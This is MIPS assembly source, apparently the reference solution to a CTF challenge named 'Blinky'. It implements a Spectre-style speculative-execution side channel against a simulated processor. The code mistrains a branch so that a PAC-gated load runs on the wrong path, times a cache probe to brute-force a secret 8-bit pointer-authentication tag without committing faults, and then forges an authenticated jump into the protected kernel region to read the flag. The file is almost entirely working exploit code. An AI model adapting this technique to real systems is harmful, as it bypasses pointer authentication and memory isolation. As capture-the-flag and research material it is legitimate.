# ref.s -- REFERENCE SOLVE for Blinky (R3CTF): the USER-region submission
# (< 0x2000). The server splices the secret kernel (>= 0x2000, per-run PAC key)
# over this. Single run, no committed faults.
#
# The flag lives at VA 0x2030 (kernel), reachable only via a `jr` whose pointer
# carries the correct 8-bit PAC tag in bits [63:56]. The tag depends on a secret
# per-run key, so it must be recovered. Recover it from a D-cache SPECTRE side
# channel WITHOUT ever committing a bad-tag fault (the rate limiter would lock):
#   * A mispredicted attack branch runs a PAC-gated shadow LOAD on its speculative
#     wrong-path. A good tag fills the USER PROBE line (0x1000); a bad tag is
#     NO_LOAD and, drained as speculative, never faults.
#   * Time a reload of PROBE: hit (~2 cyc) => this guess is the tag; miss => wrong.
#   * Miss latency is noisy (I$/D$ arbiter beat), so VOTE: measure each guess
#     twice and accept only if BOTH are hits. A wrong guess drifts +53/iter and
#     cannot read < THRESH twice in a row -> zero false positives.
# On the recovered tag we authenticate ONE `jr {tag,0x2030}` -> the kernel prints
# the flag.
    .set noreorder
    .equ THRESH, 8

    .section .boot, "ax"          # USER region [0, 0x2000) -- the whole submission
    .balign 4
    .org 0x0
_uexc:
    j    _uexc                    # 0x00: fault vector (should never be hit)
    nop
    .org 0x0c
__start_user:                     # 0x0c: eret target (USER mode) -- ABI entry
    lui  $s0, 0x2000              # cyccnt MMIO (0x20000000)
    ori  $s1, $s0, 0x10           # stdout MMIO  (0x20000010)
    dli  $s4, 0x2030              # FLAG / WIN VA (given in the challenge)
    dli  $s6, 0x1000              # PROBE line (D-cache index 0, way0) -- user-owned
    dli  $gp, 0x1800              # index 0, way1 (2nd WB_INVALIDATE)
    ori  $v0, $zero, 1            # const 1 -> attack/benign always taken
    ori  $s2, $zero, 0            # guess (8-bit tag)
    ori  $s3, $zero, 0            # ok_count for the current guess
    ori  $s5, $zero, 2            # reps remaining for the current guess
    dli  $s7, 300                 # safety budget
loop:
    cache 0x01, 0($s6)           # WB_INVALIDATE PROBE index0 way0
    cache 0x01, 0($gp)           # WB_INVALIDATE PROBE index0 way1 -> PROBE flushed
    dsll $t1, $s2, 56            # tag -> bits[63:56]
    or   $t1, $t1, $s4           # {tag, VA=0x2030} -> gated-load address
    nop
    nop
    .balign 0x100                # attack @ BTB index 0
attack:
    bne  $v0, $zero, do_probe    # taken -> do_probe; predicted not-taken -> mispredict
    lw   $t2, 0($t1)             # SHADOW gated load (drains); good tag fills PROBE
    j    waste                   # divert wrong-path away from the probe
    nop
waste:
    j    waste                   # speculative dead-end (squashed)
    nop
do_probe:                         # taken target: architectural probe (settled)
    lw   $t2, 0($s0)            # c0
    lw   $t8, 0($s6)            # PROBE reload (hit if correct, miss if wrong)
    lw   $t3, 0($s0)            # c1
    subu $t3, $t3, $t2          # D1 = probe latency
    sltiu $t9, $t3, THRESH      # 1 if hit (D1 < THRESH)
    addu $s3, $s3, $t9          # ok_count += hit
    addiu $s5, $s5, -1          # reps--
    bne  $s5, $zero, cont       # still measuring this guess
    nop
    dli  $t8, 2
    beq  $s3, $t8, found        # hit BOTH times -> this is the tag
    nop
    addiu $s2, $s2, 1           # next guess
    andi $s2, $s2, 0xff
    ori  $s5, $zero, 2          # reset reps
    ori  $s3, $zero, 0          # reset ok_count
    addiu $s7, $s7, -1
    beq  $s7, $zero, giveup
    nop
cont:
    .balign 0x100               # benign @ attack+0x100 (same idx, diff tag -> ping-pong)
benign:
    bne  $v0, $zero, loop
    nop
found:
    dsll $t0, $s2, 56           # {found_tag<<56}
    or   $t0, $t0, $s4          # {tag, 0x2030}
    jr   $t0                    # authenticated cross -> kernel prints the flag
    nop
giveup:                           # every gated guess missed => the oracle's one blind
                                  # spot is tag 0: guess 0 has a zero top byte, so its
                                  # shadow load is NOT gated and never probes. Hence the
                                  # tag must be 0 -> cross with {0, 0x2030}. No bad-tag
                                  # fault was ever committed, so the gate is still open
                                  # and this authenticates cleanly.
    jr   $s4                      # jr {tag=0, VA=0x2030}
    nop